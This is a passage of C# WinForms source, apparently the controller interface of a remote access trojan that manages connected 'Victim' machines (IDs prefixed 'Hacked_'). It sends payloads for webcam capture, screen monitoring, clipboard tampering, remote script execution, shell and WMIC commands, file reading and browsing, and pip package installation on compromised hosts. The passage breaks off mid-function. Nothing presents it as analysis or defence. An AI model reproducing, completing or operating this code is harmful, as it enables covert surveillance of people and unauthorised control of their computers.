        public void Disconnect(Listener l, Victim v)
        {
            ListViewItem item = GetVictimLvItem(v: v);
            if (item == null)
                return;

            listView2.Invoke(new Action(() =>
            {
                string onlineID = item.Text;
                bool unix_like = !item.SubItems[4].Text.ToLower().Contains("windows");
                C2.Victims.Remove(onlineID);
                listView2.Items.Remove(item);

                string os = unix_like ? "Linux" : "Windows";
                string ip = item.SubItems[2].Text;
                string host = $"{onlineID.Replace("Hacked_", string.Empty)}@{ip}";
                TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, $"Victim\\{os}\\{host}");
                treeView1.Nodes.Remove(node);

                foreach (Function func in Enum.GetValues(typeof(Function)))
                {
                    TabPage page = FindTabPage(v, func);
                    Form form = FindActiveForm(v, func);
                    if (page != null)
                        tabControl2.TabPages.Remove(page);
                    if (form != null)
                        form.Close();
                }
            }));
            v.socket.Close();

            //WRITE STATUS
            SystemStatus($"Client[ {v.ID}@{v.rAddr}:{v.rPort} ] is disconnected.");
        }

        ListViewItem GetVictimLvItem(string onlineID = null, Victim v = null)
        {
            ListViewItem item = null;

            //CHECK ERROR
            if (onlineID == null && v == null)
            {
                MessageBox.Show("BAD CALL...", "GetVictimLvItem", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return null;
            }

            //METHOD 1 : SEARCH LISTVIEWITEM BY ONLINE ID.
            if (onlineID != null)
            {
                listView2.Invoke(new Action(() => item = listView2.FindItemWithText(onlineID)));
            }

            //METHOD 2 : SEARCH LISTVIEWITEM BY REMOTE END POINT.
            if (v != null)
            {
                try
                {
                    listView2.Invoke(new Action(() =>
                    {
                        foreach (ListViewItem _item in listView2.Items)
                        {
                            Victim _v = (Victim)_item.Tag;
                            if ((_v.rAddr, _v.rPort) == (v.rAddr, v.rPort))
                            {
                                item = _item;
                                break;
                            }
                        }
                    }));
                }
                catch
                {

                }
            }

            //IT STILL CAN BE NULL, ISN'T IT?
            if (item == null)
                MessageBox.Show("Item null!", "GetVictimLvItem", MessageBoxButtons.OK, MessageBoxIcon.Warning);

            return item;
        }

        //CLIENT AND SERVER [END]

        //STATUS [START]
        ListViewItem kx_GetLvItem(Victim v)
        {
            ListViewItem _item = null;
            foreach (ListViewItem item in listView4.Items)
            {
                if ((Victim)item.Tag == v)
                {
                    _item = item;
                    break;
                }
            }
            return _item;
        }

        public void SystemStatus(string msg)
        {
            Invoke(new Action(() =>
            {
                richTextBox1.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n");
                richTextBox1.ScrollToCaret();
            }));
        }
        public void TransportStatus(string msg)
        {
            Invoke(new Action(() =>
            {
                richTextBox2.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n");
                richTextBox2.ScrollToCaret();
            }));
        }
        public void KeyExchangeStatus(Victim v, string msg)
        {
            Invoke(new Action(() =>
            {
                ListViewItem item = kx_GetLvItem(v);
                string date_str = C1.DateTimeStrFormat();
                if (item == null) //CREATE NEW
                {
                    ListViewItem _item = new ListViewItem(date_str);
                    _item.SubItems.Add(date_str);
                    _item.SubItems.Add($"{v.rAddr}:{v.rPort}");
                    _item.SubItems.Add(msg);
                    _item.Tag = v;
                    listView4.Items.Add(_item);
                    _item.EnsureVisible();
                }
                else
                {
                    item.SubItems[1].Text = date_str;
                    item.SubItems[3].Text = msg;
                }
            }));
        }
        public void ErrorLogs(string msg)
        {
            Invoke(new Action(() =>
            {
                richTextBox3.AppendText($"{C1.DateTimeStrFormat()}: {msg}\n");
                richTextBox3.ScrollToCaret();
            }));
        }

        //STATUS [END]

        //VIEW(LAYOUT)
        private void view_All()
        {
            var item1 = toolStripMenuItem40;
            var item2 = toolStripMenuItem41;
            var item3 = toolStripMenuItem42;

            bool status = item1.Checked;
            bool new_status = !status;

            splitContainer1.Panel1Collapsed = status;
            splitContainer3.Panel2Collapsed = status;

            item1.Checked = new_status;
            item2.Checked = new_status;
            item3.Checked = new_status;
        }
        private void view_Target()
        {
            var item = toolStripMenuItem41;
            bool status = item.Checked;
            bool new_status = !status;

            splitContainer1.Panel1Collapsed = status;
            item.Checked = new_status;
        }
        private void view_Status()
        {
            var item = toolStripMenuItem42;
            bool status = item.Checked;
            bool new_status = !status;

            splitContainer3.Panel2Collapsed = status;
            item.Checked = new_status;
        }

        //FIND ACTIVE FORM
        Form FindActiveForm(Victim v, Function func, bool show_err = true)
        {
            Form form = null;
            foreach (Form f in Application.OpenForms)
            {
                try
                {
                    if (f.Tag != null)
                    {
                        object[] objs = (object[])f.Tag;
                        Victim _v = (Victim)objs[0];
                        Function _f = (Function)objs[1];
                        if (v == _v && func == _f)
                        {
                            form = f;
                            break;
                        }
                    }
                }
                catch
                {

                }
            }
            return form;
        }

        //COMPONENT [START]
        //GENERAL FUNCTION
        //LISTVIEW
        private void lvExport2CSV(ListView lv, string filename)
        {
            using (FileStream fs = new FileStream(filename, FileMode.Create, FileAccess.Write))
            {
                using (StreamWriter sw = new StreamWriter(fs))
                {
                    sw.WriteLine(string.Join(",", lv.Columns.Cast<ColumnHeader>().Select(column => column.Text).ToArray()));
                    foreach (ListViewItem item in lv.Items)
                    {
                        sw.WriteLine(string.Join(",", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text).ToArray()));
                    }
                }
            }
            MessageBox.Show("Export file successfully: " + filename, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        string lvCopy(ListView lv, int[] index) //SPECIFIED
        {
            string text = null;
            string[] arr = lv.SelectedItems[0].SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text).ToArray();
            text = string.Join("|", arr.Where((x, i) => index.Contains(i)));
            return text;
        }
        string lvCopy(ListView lv, int[][] index, string s1, string s2)
        {
            string text = null;
            string[] arr = lv.SelectedItems[0].SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text).ToArray();
            List<string> list = new List<string>();
            foreach (int[] i in index)
            {
                list.Add(string.Join(s1, arr.Where((x, j) => i.Contains(j))));
            }

            text = string.Join(s2, list.ToArray());

            return text;
        }
        string lvCopy(ListView lv) //ALL
        {
            string text = null;
            text = string.Join("|", lv.SelectedItems[0].SubItems.Cast<ListViewItem.ListViewSubItem>().Select(x => x.Text).ToArray());
            return text;
        }

        //END OF GENERAL FUNCTION


        //Clipboard
        (ToolStrip ts, TextEditorControl editor, ListView lv) cb_GetControls(Victim v)
        {
            ToolStrip ts = null;
            TextEditorControl editor = null;
            ListView lv = null;
            Invoke(new Action(() =>
            {
                TabPage page = FindTabPage(v, Function.Clipboard);
                ts = (ToolStrip)page.Controls[0];
                lv = (ListView)((SplitContainer)page.Controls[1]).Panel1.Controls[0];
                editor = (TextEditorControl)((SplitContainer)page.Controls[1]).Panel2.Controls[0];
            }));

            return (ts, editor, lv);
        }
        private void cblv_Click(object sender, EventArgs e)
        {
            var x = cb_GetControls(GetVictimInCurrentTab());
            Invoke(new Action(() =>
            {
                if (x.lv.SelectedItems.Count > 0)
                {
                    ListViewItem item = x.lv.SelectedItems[0];
                    x.editor.Text = string.Empty;
                    x.editor.Text = item.Tag.ToString();
                }
            }));
        }

        //EvalScript
        (ToolStrip ts, TreeView tv, TextEditorControl editor, RichTextBox output) es_GetControls(Victim v)
        {
            ToolStrip ts = null;
            TreeView tv = null;
            TextEditorControl editor = null;
            RichTextBox output = null;
            Invoke(new Action(() =>
            {
                TabPage page = FindTabPage(v, Function.EvalScript);
                tv = (TreeView)((SplitContainer)((SplitContainer)page.Controls[0]).Panel1.Controls[0]).Panel1.Controls[0];
                editor = (TextEditorControl)((SplitContainer)((SplitContainer)page.Controls[1]).Panel1.Controls[0]).Panel2.Controls[0];
                output = (RichTextBox)((SplitContainer)page.Controls[1]).Panel2.Controls[0];
            }));

            return (ts, tv, editor, output);
        }

        //PIP MANAGER - FILTER
        public void pip_Filter(pip_F filter, Victim v)
        {
            TabPage page = FindTabPage(v, Function.pip_Manager);
            if (page == null)
                return;

            tabControl2.SelectedTab = page;
            var x = pip_GetControls(v);
            List<ListViewItem> list = new List<ListViewItem>();
            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
            x.lv.Items.Clear();
            foreach (ListViewItem item in list)
            {
                if (filter.regex)
                {
                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
                        continue;
                }
                else
                {
                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
                        continue;
                }

                x.lv.Items.Add(item);
            }
            MessageBox.Show("Match : " + x.lv.Items.ToString(), "pip Manager - Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        //CONENCTION - FILTER
        public void conn_Filter(conn_F filter, Victim v)
        {
            TabPage page = FindTabPage(v, Function.Connection);
            if (page == null)
                return;

            tabControl2.SelectedTab = page;
            var x = conn_GetControls();
            List<ListViewItem> list = new List<ListViewItem>();
            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
            x.lv.Items.Clear();
            foreach (ListViewItem item in list)
            {
                if (filter.regex)
                {
                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
                        continue;
                }
                else
                {
                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
                        continue;
                }

                x.lv.Items.Add(item);
            }
            MessageBox.Show("Match : " + x.lv.Items.Count.ToString(), "Conn Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        //SERVICE - FILTER
        public void serv_Filter(serv_F filter, Victim v)
        {
            TabPage page = FindTabPage(v, Function.Service);
            if (page == null)
                return;

            tabControl2.SelectedTab = page;
            var x = serv_GetControls();
            List<ListViewItem> list = new List<ListViewItem>();
            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
            x.lv.Items.Clear();
            foreach (ListViewItem item in list)
            {
                if (filter.regex)
                {
                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
                        continue;
                }
                else
                {
                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
                        continue;
                }

                x.lv.Items.Add(item);
            }
            MessageBox.Show("Match : " + x.lv.Items.Count.ToString(), "Serv Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        //PROCESS - FILTER
        public void proc_Filter(Proc_F filter, Victim v)
        {
            TabPage page = FindTabPage(v, Function.Process);
            if (page == null)
                return;

            tabControl2.SelectedTab = page;
            var x = proc_GetControls();
            List<ListViewItem> list = new List<ListViewItem>();
            list.AddRange(x.lv.Items.Cast<ListViewItem>().ToList());
            x.lv.Items.Clear();
            foreach (ListViewItem item in list)
            {
                if (filter.regex)
                {
                    if (!Regex.IsMatch(item.Text, filter.pattern, filter.ignore_case ? RegexOptions.IgnoreCase : RegexOptions.None))
                        continue;
                }
                else
                {
                    if (!item.Text.Contains(filter.pattern, filter.ignore_case ? StringComparison.CurrentCultureIgnoreCase : StringComparison.CurrentCulture))
                        continue;
                }

                x.lv.Items.Add(item);
            }
            MessageBox.Show("Match : " + x.lv.Items.Count.ToString(), "Proc Filter", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        //FILE - FILTER
        public void file_Filter(file_F filter)
        {
            var _var = file_GetControls();
            Victim v = GetVictimInCurrentTab();
            fileFilter_AddItem();
            _var.lv.Items.Clear();

            foreach (file_Info info in C2.filter_storage[v][Function.FileManager])
            {
                try
                {
                    if (Regex.IsMatch(Path.GetFileName(info.path), filter.pattern) || string.IsNullOrEmpty(filter.pattern))
                    {
                        //FILE? FOLDER?
                        if (info.file && !filter.file)
                            continue;
                        if (!info.file && !filter.folder)
                            continue;

                        //DATE TIME
                        if (filter.use_date && (long.Parse(info.cd) < filter.date_initial || long.Parse(info.cd) > filter.date_final))
                            continue;

                        if (filter.use_date && (long.Parse(info.md) < filter.date_initial || long.Parse(info.md) > filter.date_final))
                            continue;

                        if (filter.use_date && (long.Parse(info.ad) < filter.date_initial || long.Parse(info.ad) > filter.date_final))
                            continue;

                        //FILE SIZE
                        if (filter.check_size)
                        {
                            int _size = int.Parse(info.size);
                            if (_size < filter.size_init || _size > filter.size_final)
                                continue;
                        }

                        ListViewItem item = new ListViewItem(Path.GetFileName(info.path));
                        item.SubItems.Add(info.priv);
                        item.SubItems.Add(info.size);
                        item.SubItems.Add(info.cd);
                        item.SubItems.Add(info.md);
                        item.SubItems.Add(info.ad);

                        item.Tag = new object[] { info.file ? "File" : "Folder", info.path };
                        if (info.file) item.ImageKey = Path.GetExtension(info.path);
                        else item.ImageIndex = 0;

                        _var.lv.Items.Add(item);
                    }
                }
                catch (RegexParseException ex)
                {
                    MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }
        private void fileFilter_AddItem()
        {
            var _var = file_GetControls();
            Victim v = GetVictimInCurrentTab();
            foreach (ListViewItem item in _var.lv.Items)
            {
                object[] objs = (object[])item.Tag;
                file_Info info = new file_Info()
                {
                    path = (string)objs[1],
                    file = (string)objs[0] == "File",
                    priv = item.SubItems[1].Text,
                    size = item.SubItems[2].Text,
                    cd = item.SubItems[3].Text,
                    md = item.SubItems[4].Text,
                    ad = item.SubItems[5].Text,
                };

                if (!C2.filter_storage.ContainsKey(v)) C2.filter_storage.Add(v, new Dictionary<Function, List<file_Info>>());
                if (!C2.filter_storage[v].ContainsKey(Function.FileManager)) C2.filter_storage[v].Add(Function.FileManager, new List<file_Info>());
                C2.filter_storage[v][Function.FileManager].Add(info);
            }
        }

        //WEBCAM
        (ToolStrip, PictureBox pb) webcam_GetControls(Victim v = null)
        {
            ToolStrip ts = null;
            PictureBox pb = null;
            Invoke(new Action(() =>
            {
                TabPage page = FindTabPage(v, Function.WebCam);
                ts = (ToolStrip)page.Controls[0];
                pb = (PictureBox)page.Controls[1];
            }));

            return (ts, pb);
        }

        //MONITOR
        (ToolStrip, PictureBox pb) monitor_GetControls()
        {
            ToolStrip ts = null;
            PictureBox pb = null;
            Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                ts = (ToolStrip)page.Controls[0];
                pb = (PictureBox)page.Controls[1];
            }));

            return (ts, pb);
        }

        //CONSOLE, RECEPTION
        private void Console_InputCmd(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                TabPage page = fram_FindTabPage();
                var _var = fram_GetControls();
                object[] objs = (object[])page.Tag;
                Process p = (Process)objs[1];
                string cmd = _var.input.Text;

                p.StandardInput.WriteLine(cmd);
                _var.input.Clear();
            }
        }
        private void ConsoleOutputReceived_Events(object sender, DataReceivedEventArgs e)
        {
            if (!string.IsNullOrEmpty(e.Data))
            {
                var _var = fram_GetControls();
                Invoke(new Action(() =>
                {
                    string output = e.Data;
                    if (output.Contains("[RECEPTION]"))
                    {
                        string payload = C1.B64StrD2Str(output.Split(new string[] { "[RECEPTION]" }, StringSplitOptions.None)[1]);
                        Victim v = fram_GetVictim();
                        v.RunPayload("ConsoleModule", v, new string[] { C1.StrE2B64Str(payload) });
                        return;
                    }
                    _var.rt.AppendText($"{e.Data}\n");
                    _var.rt.ScrollToCaret();
                }));
            }
        }
        (RichTextBox rt, TextBox input) fram_GetControls(Victim v = null)
        {
            RichTextBox rt = null;
            TextBox input = null;
            TabPage page = null;
            Invoke(new Action(() =>
            {
                if (v == null) page = tabControl3.SelectedTab;
                else page = fram_FindTabPage(v);

                rt = (RichTextBox)page.Controls[0];
                input = (TextBox)page.Controls[1];
            }));
            return (rt, input);
        }
        TabPage fram_FindTabPage(Victim v = null)
        {
            TabPage page = null;
            Invoke(new Action(() =>
            {
                if (v == null)
                {
                    page = tabControl3.SelectedTab;
                }
                else
                {
                    foreach (TabPage _page in tabControl3.TabPages)
                    {
                        if (_page.Tag == null) continue;

                        object[] objs = (object[])_page.Tag;
                        if ((Victim)objs[0] == v)
                        {
                            page = _page;
                            break;
                        }
                    }
                }
            }));
            return page;
        }
        Victim fram_GetVictim()
        {
            TabPage page = fram_FindTabPage();
            object[] objs = (object[])page.Tag;
            return (Victim)objs[0];
        }

        //REMOTE PLUGIN
        (TextBox t, ListView lv, StatusStrip ss) rPlugin_GetControls(Victim v)
        {
            TextBox t = null;
            ListView lv = null;
            StatusStrip ss = null;
            Invoke(new Action(() =>
            {
                TabPage page = FindTabPage(v, Function.RemotePlugin);
                t = page.Controls[0] as TextBox;
                lv = page.Controls[1] as ListView;
                ss = page.Controls[2] as StatusStrip;
            }));
            return (t, lv, ss);
        }

        (ListView lv, TextEditorControl editor, StatusStrip ss) pip_GetControls(Victim v)
        {
            ListView lv = null;
            TextEditorControl editor = null;
            StatusStrip ss = null;
            Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                SplitContainer sc = page.Controls[1] as SplitContainer;
                lv = sc.Panel1.Controls[0] as ListView;
                editor = sc.Panel2.Controls[0] as TextEditorControl;
                ss = page.Controls[2] as StatusStrip;
            }));
            return (lv, editor, ss);
        }

        (ListView lv, StatusStrip ss) conn_GetControls()
        {
            ListView lv = null;
            StatusStrip ss = null;
            Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                lv = (ListView)page.Controls[0];
                ss = (StatusStrip)page.Controls[1];
            }));

            return (lv, ss);
        }

        (ListView lv, StatusStrip ss) serv_GetControls()
        {
            ListView lv = null;
            StatusStrip ss = null;
            tabControl2.Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                lv = (ListView)page.Controls[0];
                ss = (StatusStrip)page.Controls[1];
            }));
            return (lv, ss);
        }

        (TreeView tv, ListView lv, StatusStrip ss) proc_GetControls()
        {
            TreeView tv = null;
            ListView lv = null;
            StatusStrip ss = null;
            tabControl2.Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                SplitContainer sc = (SplitContainer)page.Controls[0];

                tv = (TreeView)sc.Panel1.Controls[0];
                lv = (ListView)sc.Panel2.Controls[0];
                ss = (StatusStrip)page.Controls[1];
            }));
            return (tv, lv, ss);
        }

        //REGISTRY
        (TextBox txt, TreeView tv, ListView lv) reg_GetControls()
        {
            TextBox txt = null;
            TreeView tv = null;
            ListView lv = null;
            tabControl2.Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                SplitContainer sc = page.Controls[1] as SplitContainer;

                txt = page.Controls[0] as TextBox;
                tv = sc.Panel1.Controls[0] as TreeView;
                lv = sc.Panel2.Controls[0] as ListView;
            }));
            return (txt, tv, lv);
        }

        (TreeView tv, ListView lv, TreeNode node, TextBox tb) file_GetControls()
        {
            TreeNode _node = null;
            TreeView tv = null;
            ListView lv = null;
            TextBox tb = null;
            tabControl2.Invoke(new Action(() =>
            {
                TabPage page = tabControl2.SelectedTab;
                tb = (TextBox)page.Controls[0];
                SplitContainer sc = page.Controls[1] as SplitContainer;
                tv = sc.Panel1.Controls[0] as TreeView;
                lv = sc.Panel2.Controls[0] as ListView;
                string cd = lv.Tag.ToString();
                bool unix_like = !cd.Contains(":");
                if (unix_like) cd = "/" + cd.Replace("/", "\\");
                _node = FindTreeNodeByFullPath(tv.Nodes, cd);
            }));
            return (tv, lv, _node, tb);
        }

        Victim GetVictimInCurrentTab()
        {
            TabPage page = tabControl2.SelectedTab;
            object[] objs = (object[])page.Tag;
            return (Victim)objs[0];
        }

        //TREE VIEW OPERATION
        TreeNode FindTreeNodeByFullPath(TreeNodeCollection collection, string fullPath, StringComparison comparison = StringComparison.InvariantCultureIgnoreCase)
        {
            var foundNode = collection.Cast<TreeNode>().FirstOrDefault(tn => string.Equals(tn.FullPath, fullPath, comparison));
            if (null == foundNode)
            {
                foreach (var childNode in collection.Cast<TreeNode>())
                {
                    var foundChildNode = FindTreeNodeByFullPath(childNode.Nodes, fullPath, comparison);
                    if (null != foundChildNode)
                    {
                        return foundChildNode;
                    }
                }
            }

            return foundNode;
        }
        private void ResursionAddTreeNodePath(string[] path, TreeNode node, bool unix_like = true)
        {
            if (path.Length == 0)
                return;

            if (path[0].Contains(":") || !unix_like) //Windows
            {
                string[] _path = path;
                if (_path[0] == node.Text && node.Parent == null)
                    _path = _path.Where((str, index) => index != 0).ToArray();

                if (string.IsNullOrWhiteSpace(_path[0]))
                    return;

                TreeNode _node = new TreeNode(_path[0]);
                node.Nodes.Add(_node);
                _path = _path.Where((str, index) => index != 0).ToArray();
                ResursionAddTreeNodePath(_path, _node, false);
            }
            else //Unix like
            {
                string[] _path = path;
                if (_path[0] == node.Text && node.Parent == null)
                    _path = _path.Where((str, index) => index != 0).ToArray();

                TreeNode _node = new TreeNode(_path[0]);
                node.Nodes.Add(_node);
                _path = _path.Where((str, index) => index != 0).ToArray();
                ResursionAddTreeNodePath(_path, _node, false);
            }
        }

        void SetProperty(Control src, Control dst)
        {
            dst.Size = src.Size;
            dst.BackColor = src.BackColor;
            dst.ForeColor = src.ForeColor;
            dst.Location = src.Location;

            dst.Dock = src.Dock == DockStyle.None ? DockStyle.None : src.Dock;
            dst.Anchor = src.Anchor == AnchorStyles.None ? AnchorStyles.None : src.Anchor;
            dst.Text = src.Text ?? src.Text;
        }

        void TabPageInit()
        {
            //DETAILS
            TabPage _page = new TabPage();
            ListView lv = new ListView();
            lv.View = View.Details;
            lv.Dock = DockStyle.Fill;
            foreach (ColumnHeader col in listView3.Columns)
            {
                ColumnHeader _col = new ColumnHeader();
                _col.Text = col.Text;
                _col.Width = col.Width;
                lv.Columns.Add(_col);
            }
            _page.Controls.Add(lv);
            _page.Text = "details";
            tabControl2.TabPages.Add(_page);

            //TERMINAL
            _page = new TabPage();
            _page.Text = "shell";
            TextBox txt = new TextBox();
            txt.Multiline = true;
            txt.ReadOnly = true;
            tabControl2.TabPages.Add(_page);
            _page.Controls.Add(txt);
            SetProperty(textBox1, txt);

            //FILE MANAGER
            _page = new TabPage();
            _page.Text = "file_manager";
            tabControl2.TabPages.Add(_page);

            txt = new TextBox();
            _page.Controls.Add(txt);
            SetProperty(txt, textBox2);
            txt.Dock = DockStyle.Top;

            SplitContainer sc = new SplitContainer();
            _page.Controls.Add(sc);
            SetProperty(splitContainer2, sc);
            sc.SplitterDistance = splitContainer2.SplitterDistance;
            sc.RightToLeft = RightToLeft.No;
            sc.FixedPanel = FixedPanel.Panel1;

            lv = new ListView();
            foreach (ColumnHeader col in listView1.Columns)
            {
                ColumnHeader _col = new ColumnHeader();
                _col.Text = col.Text;
                _col.Width = col.Width;
                lv.Columns.Add(_col);
            }
            lv.View = View.Details;
            lv.FullRowSelect = true;
            lv.SmallImageList = C2.il;
            lv.DoubleClick += FileListViewDoubleClick;
            sc.Panel2.Controls.Add(lv);
            SetProperty(listView1, lv);
            TreeView tv = new TreeView();
            sc.Panel1.Controls.Add(tv);
            tv.ImageList = imageList1;
            tv.AfterSelect += FileTreeViewAfterSelect;
            SetProperty(treeView2, tv);

            StatusStrip ss = new StatusStrip();
            ToolStripStatusLabel tssl = new ToolStripStatusLabel();
            ss.Items.Add(tssl);
            SetProperty(statusStrip2, ss);
            _page.Controls.Add(ss);

            //READ FILE
            _page = new TabPage();
            _page.Text = "readfile";
            tabControl2.TabPages.Add(_page);

            txt = new TextBox(); //FILE PATH
            SetProperty(textBox3, txt);
            _page.Controls.Add(txt);

            TextEditorControl editor = new TextEditorControl(); //TEXT EDITOR
            SetProperty(textEditorControl1, editor);
            _page.Controls.Add(editor);

            txt = new TextBox(); //SEARCH BAR
            SetProperty(textBox4, txt);
            _page.Controls.Add(txt);
        }

        //COMPONENT [END]

        //EVENT [START]
        //CLIPBOARD
        private void cbtn1_set(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            var x = cb_GetControls(v);
            string text = x.editor.Text;
            v.RunPayload("Clipboard", v, new string[] { "s", C1.StrE2B64Str(text) });
        }

        //EVAL SCRIPT
        private void esbtn1_execute(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            var x = es_GetControls(v);
            string code = x.editor.Text;
            v.RunPayload("EvalScript", v, new string[] { "e", C1.StrE2B64Str(code) });
        }
        private void esbtn2_save(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {

            }
        }

        //WEBCAM
        private void wbtn1_start(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            v.RunPayload("WebCam", v, new string[] { "start" });
        }
        private void wbtn2_stop(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            v.RunPayload("WebCam", v, new string[] { "stop" });
        }
        private void wbtn3_capture(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            v.RunPayload("WebCam", v, new string[] { "c" });
        }
        private void wbtn4_si(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                Victim v = GetVictimInCurrentTab();
            }
        }
        private void wbtn5_smp4(object sender, EventArgs e)
        {

        }

        //MONITOR
        private void mbtn1_start(object sender, EventArgs e) //MONITOR BUTTON 1 - START
        {
            Victim v = GetVictimInCurrentTab();
            v.RunPayload("Monitor", v, new string[] { "m_start" });
        }
        private void mbtn2_stop(object sender, EventArgs e) //MONITOR BUTTON 2 - STOP
        {
            Victim v = GetVictimInCurrentTab();
            v.RunPayload("Monitor", v, new string[] { "m_stop" });
        }
        private void mbtn3_shot(object sender, EventArgs e) //MONITOR BUTTON 3 - SCREEN SHOT
        {
            Victim v = GetVictimInCurrentTab();
            v.RunPayload("Monitor", v, new string[] { "s" });
        }
        private void mbtn4_si(object sender, EventArgs e) //MONITOR BUTTON 4 - SAVE IMAGE
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                var _var = monitor_GetControls();
                Image image = _var.pb.Image;
                image.Save(sfd.FileName);
                MessageBox.Show($"Saved : {sfd.FileName}", "Monitor - Save image", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }
        private void mbtn5_smp4(object sender, EventArgs e) //MONITOR BUTTON 5 - SAVE MP4
        {

        }

        //PIP MANAGER
        private void pipBtn_List(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            var _var = pip_GetControls(v);
            _var.lv.Items.Clear();
            v.RunPayload("pip_Mgr", v, new string[] { "l" });
        }
        private void pipBtn_Find(object sender, EventArgs e)
        {
            Victim v = GetVictimInCurrentTab();
            frmPipFind f = new frmPipFind();
            f.Text = $@"pip Manager - Filter\\{v.ID}";
            f.v = v;
            f.f1 = this;
            f.Show();
        }
        private void pipBtn_Install(object sender, EventArgs e)
        {
            pip_Install();
        }
        private void pipBtn_Uninstall(object sender, EventArgs e)
        {
            pip_Uninstall();
        }

        //FILE MANAGER
        private void WMIC_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control)
            {

            }
            else if (e.KeyCode == Keys.Enter)
            {
                TabPage page = tabControl2.SelectedTab;
                RichTextBox prompt = page.Controls[0] as RichTextBox;
                Victim v = GetVictimInCurrentTab();

                StringBuilder sb = new StringBuilder();
                int index = (int)prompt.Tag;
                for (int i = index; i < prompt.Text.Length; i++) sb.Append(prompt.Text[i]);

                v.RunPayload("WMIC", v, new string[] { "d", C1.StrE2B64Str(sb.ToString()) });
            }
        }

        private void FileTreeViewAfterSelect(object sender, TreeViewEventArgs e)
        {
            TabPage page = tabControl2.SelectedTab;
            TreeNode node = e.Node;
            ToolStripStatusLabel label = (page.Controls[2] as StatusStrip).Items[0] as ToolStripStatusLabel;
            label.Text = "Please wait...";
            string path = node.FullPath;
            if (node.Parent == null && path.Contains(":"))
                path += "\\";
            else if (node.Parent == null && !path.Contains(":"))
                path = "/";
            path = path.Replace("\\", "/");
            object[] objs = page.Tag as object[];
            Victim v = objs[0] as Victim;
            v.RunPayload("File", v, new string[] { "sd", path });
        }

        //READ FILE OR OPEN FOLDER
        private void FileListViewDoubleClick(object sender, EventArgs e)
        {
            ReadFileOrOpenDir();
        }

        //READ FILE -> SEARCH TEXT
        private void TextEditorSearchText_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                TabPage page = tabControl2.SelectedTab;
                TextEditorControl editor = (TextEditorControl)page.Controls[1];
                TextBox search_bar = (TextBox)page.Controls[2];
                string text = search_bar.Text;
                int index = (int)editor.Tag;
                int offset = editor.Text.IndexOf(text, index, StringComparison.CurrentCultureIgnoreCase);
                if (offset >= 0)
                {
                    index = offset + text.Length;
                    var start = editor.Document.OffsetToPosition(offset);
                    var end = editor.Document.OffsetToPosition(offset + text.Length);
                    editor.ActiveTextAreaControl.SelectionManager.SetSelection(start, end);

                    editor.ActiveTextAreaControl.Caret.Position = end;
                    editor.ActiveTextAreaControl.TextArea.ScrollToCaret();
                }
                else
                {
                    index = 0;
                }
                editor.Tag = index;
            }
        }
        private void TextEditorSearchBar_Click(object sender, EventArgs e)
        {
            TabPage page = tabControl2.SelectedTab;
            TextBox search_bar = (TextBox)page.Controls[2];
            bool first_click = (bool)search_bar.Tag;
            if (first_click)
            {
                search_bar.Text = string.Empty;
                search_bar.Tag = false;
            }
        }

        private void TextEditorWriteFile_KeyDown(object sender, KeyEventArgs e)
        {

        }

        private void Shell_KeyDown(object sender, KeyEventArgs e)
        {
            try
            {
                TabPage page = tabControl2.SelectedTab;
                TextBox exec_tb = page.Controls[0] as TextBox;
                TextBox prompt_tb = page.Controls[1] as TextBox;
                if (e.KeyCode == Keys.Enter)
                {
                    int index = (int)prompt_tb.Tag;
                    Victim v = (Victim)((object[])page.Tag)[0];
                    StringBuilder sb = new StringBuilder();
